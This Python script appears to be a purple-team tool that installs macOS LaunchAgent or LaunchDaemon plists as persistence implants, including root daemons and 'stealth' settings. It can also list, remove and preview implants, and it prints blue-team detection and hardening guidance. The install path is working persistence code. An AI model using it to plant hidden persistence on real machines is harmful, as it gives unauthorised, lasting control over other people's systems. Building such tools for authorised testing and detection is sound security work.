#!/usr/bin/env python3
"""
LaunchAgent/LaunchDaemon Implant — The Eden's Sins Phase 3
MITRE ATT&CK: T1543.001 Launch Agent / T1543.004 Launch Daemon

Creates persistence via macOS LaunchAgent or LaunchDaemon plists.
Supports multiple persistence modes:
  - User LaunchAgent (no root required)
  - Global LaunchAgent (root required)
  - System LaunchDaemon (root required, runs as root)

Usage:
    python3 launch_agent_implant.py --mode agent --label com.test.demo \
        --program /usr/bin/python3 --args "-c" "print('hello')"
    python3 launch_agent_implant.py --mode daemon --label com.test.svc \
        --program /bin/bash --args "-c" "whoami > /tmp/test.txt" --install
    python3 launch_agent_implant.py --remove --label com.test.demo

Author: The Eden's Sins / Purple Team
"""

import argparse
import json
import os
import plistlib
import shutil
import subprocess
import sys
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional


@dataclass
class ImplantConfig:
    """LaunchAgent/Daemon configuration."""
    label: str = ""
    mode: str = "agent"  # agent | global_agent | daemon
    program: str = ""
    program_args: list[str] = None
    run_at_load: bool = True
    keep_alive: bool = False
    start_interval: int = 0
    watch_paths: list[str] = None
    environment: dict = None
    stdout_path: str = ""
    stderr_path: str = ""
    working_directory: str = ""
    nice: int = 0
    # Stealth options
    process_type: str = ""  # Background, Standard, Interactive
    low_priority_io: bool = True
    throttle_interval: int = 0


# Persistence directories
PERSIST_DIRS = {
    "agent": "~/Library/LaunchAgents",
    "global_agent": "/Library/LaunchAgents",
    "daemon": "/Library/LaunchDaemons",
}


def get_plist_path(config: ImplantConfig) -> Path:
    """Get the plist file path for given config."""
    base_dir = os.path.expanduser(PERSIST_DIRS[config.mode])
    return Path(base_dir) / f"{config.label}.plist"


def build_plist(config: ImplantConfig) -> dict:
    """Build a plist dictionary from config."""
    plist = {
        "Label": config.label,
        "RunAtLoad": config.run_at_load,
    }

    # Program and arguments
    if config.program_args:
        plist["ProgramArguments"] = [config.program] + config.program_args
    else:
        plist["Program"] = config.program

    # Scheduling
    if config.keep_alive:
        plist["KeepAlive"] = True

    if config.start_interval > 0:
        plist["StartInterval"] = config.start_interval

    if config.watch_paths:
        plist["WatchPaths"] = config.watch_paths

    # Environment
    if config.environment:
        plist["EnvironmentVariables"] = config.environment

    # Logging
    if config.stdout_path:
        plist["StandardOutPath"] = config.stdout_path
    if config.stderr_path:
        plist["StandardErrorPath"] = config.stderr_path

    # Working directory
    if config.working_directory:
        plist["WorkingDirectory"] = config.working_directory

    # Resource control
    if config.nice != 0:
        plist["Nice"] = config.nice
    if config.process_type:
        plist["ProcessType"] = config.process_type
    if config.low_priority_io:
        plist["LowPriorityIO"] = True
    if config.throttle_interval > 0:
        plist["ThrottleInterval"] = config.throttle_interval

    return plist


def preview_plist(config: ImplantConfig) -> str:
    """Generate a human-readable preview of the plist."""
    plist = build_plist(config)
    # Convert to XML plist format for preview
    return plistlib.dumps(plist, fmt=plistlib.FMT_XML).decode("utf-8")


def install_implant(config: ImplantConfig, dry_run: bool = False) -> bool:
    """Install the LaunchAgent/Daemon."""
    plist_path = get_plist_path(config)
    plist_data = build_plist(config)

    print(f"\n[*] Target: {plist_path}")
    print(f"[*] Mode: {config.mode}")
    print(f"[*] Label: {config.label}")
    print(f"[*] Program: {config.program}")

    if dry_run:
        print("\n[DRY RUN] Would write plist:")
        print(preview_plist(config))
        return True

    # Create directory if needed
    plist_path.parent.mkdir(parents=True, exist_ok=True)

    # Write plist
    with open(plist_path, "wb") as f:
        plistlib.dump(plist_data, f, fmt=plistlib.FMT_XML)

    # Set permissions
    if config.mode == "agent":
        os.chmod(plist_path, 0o644)
    else:
        os.chmod(plist_path, 0o644)
        # System-level may need root ownership
        if os.geteuid() == 0:
            os.chown(plist_path, 0, 0)  # root:wheel

    print(f"[+] Plist written to {plist_path}")

    # Load via launchctl
    domain = "gui/" + str(os.getuid()) if config.mode == "agent" else "system"
    load_cmd = ["launchctl", "bootstrap", domain, str(plist_path)]

    # Fallback for older macOS
    load_cmd_legacy = ["launchctl", "load", str(plist_path)]

    try:
        result = subprocess.run(
            load_cmd, capture_output=True, text=True, timeout=10,
        )
        if result.returncode != 0:
            # Try legacy command
            result = subprocess.run(
                load_cmd_legacy, capture_output=True, text=True, timeout=10,
            )

        if result.returncode == 0:
            print(f"[+] Loaded successfully via launchctl")
            return True
        else:
            print(f"[!] launchctl returned: {result.stderr}")
            print("[*] Plist is written — will activate on next login/reboot")
            return True
    except Exception as e:
        print(f"[-] Error loading: {e}")
        print("[*] Plist is written — will activate on next login/reboot")
        return True


def remove_implant(label: str) -> bool:
    """Remove a LaunchAgent/Daemon by label."""
    # Search all persistence directories
    for mode, dir_path in PERSIST_DIRS.items():
        plist_path = Path(os.path.expanduser(dir_path)) / f"{label}.plist"
        if plist_path.exists():
            print(f"[*] Found: {plist_path}")

            # Unload
            domain = (
                f"gui/{os.getuid()}" if mode == "agent" else "system"
            )
            try:
                subprocess.run(
                    ["launchctl", "bootout", domain, str(plist_path)],
                    capture_output=True, timeout=10,
                )
            except Exception:
                try:
                    subprocess.run(
                        ["launchctl", "unload", str(plist_path)],
                        capture_output=True, timeout=10,
                    )
                except Exception:
                    pass

            # Remove file
            plist_path.unlink()
            print(f"[+] Removed: {plist_path}")
            return True

    print(f"[-] No plist found for label: {label}")
    return False


def list_implants() -> None:
    """List all non-Apple LaunchAgents/Daemons."""
    print("\n" + "=" * 60)
    print("  Installed LaunchAgents / LaunchDaemons (non-Apple)")
    print("=" * 60)

    for mode, dir_path in PERSIST_DIRS.items():
        expanded = os.path.expanduser(dir_path)
        if not os.path.isdir(expanded):
            continue

        print(f"\n  📁 {expanded} ({mode}):")
        for plist_file in sorted(Path(expanded).glob("*.plist")):
            name = plist_file.stem
            if name.startswith("com.apple."):
                continue  # Skip Apple's own

            try:
                with open(plist_file, "rb") as f:
                    data = plistlib.load(f)
                program = data.get(
                    "Program",
                    " ".join(data.get("ProgramArguments", ["?"])),
                )
                run_at_load = data.get("RunAtLoad", False)
                keep_alive = data.get("KeepAlive", False)

                flags = []
                if run_at_load:
                    flags.append("RunAtLoad")
                if keep_alive:
                    flags.append("KeepAlive")

                print(f"    {'🔴' if keep_alive else '🟡'} {name}")
                print(f"        Program: {program}")
                if flags:
                    print(f"        Flags: {', '.join(flags)}")
            except Exception:
                print(f"    ⚪ {name} (unreadable)")

    print("")


def print_detection_guide() -> None:
    """Print blue team detection guidance."""
    print("\n" + "=" * 60)
    print("  BLUE TEAM — Detection & Hardening")
    print("=" * 60)
    print("""
  Detection:
    • Monitor file writes to LaunchAgent/LaunchDaemon directories
    • Use Endpoint Security Framework (ESF) for real-time file monitoring
    • KnockKnock (Objective-See) scans all persistence locations
    • osquery: SELECT * FROM launchd WHERE path NOT LIKE '%com.apple%'
    • Sigma: file_event with target_path containing 'LaunchAgents'

  Hardening:
    • Use MDM to restrict LaunchAgent/Daemon installation
    • Implement allowlisting via Santa or similar
    • Monitor launchctl bootstrap/load calls in Unified Logging
    • Set immutable flag on LaunchDaemon directories (with SIP)
    • Audit non-Apple plists regularly

  MITRE Detection Data Sources:
    • File: File Creation (DS0022)
    • Command: Command Execution (DS0017)
    • Process: Process Creation (DS0009)
    • Service: Service Creation (DS0019)
    """)


def main() -> None:
    parser = argparse.ArgumentParser(
        description="LaunchAgent/Daemon Implant — The Eden's Sins",
    )
    subparsers = parser.add_subparsers(dest="action")

    # Install
    install_parser = subparsers.add_parser("install", help="Install implant")
    install_parser.add_argument(
        "--mode", choices=["agent", "global_agent", "daemon"],
        default="agent", help="Persistence mode",
    )
    install_parser.add_argument("--label", required=True, help="Job label")
    install_parser.add_argument("--program", required=True, help="Program path")
    install_parser.add_argument("--args", nargs="*", help="Program arguments")
    install_parser.add_argument(
        "--keep-alive", action="store_true", help="Restart on crash",
    )
    install_parser.add_argument(
        "--interval", type=int, default=0, help="Run interval in seconds",
    )
    install_parser.add_argument(
        "--dry-run", action="store_true",
        help="Preview only, don't install",
    )

    # Remove
    remove_parser = subparsers.add_parser("remove", help="Remove implant")
    remove_parser.add_argument("--label", required=True, help="Job label")

    # List
    subparsers.add_parser("list", help="List non-Apple persistence items")

    # Detect
    subparsers.add_parser("detect", help="Show detection guidance")

    args = parser.parse_args()

    if args.action == "install":
        config = ImplantConfig(
            label=args.label,
            mode=args.mode,
            program=args.program,
            program_args=args.args or [],
            keep_alive=args.keep_alive,
            start_interval=args.interval,
        )
        install_implant(config, dry_run=args.dry_run)
        print_detection_guide()

    elif args.action == "remove":
        remove_implant(args.label)

    elif args.action == "list":
        list_implants()

    elif args.action == "detect":
        print_detection_guide()

    else:
        parser.print_help()


if __name__ == "__main__":
    main()
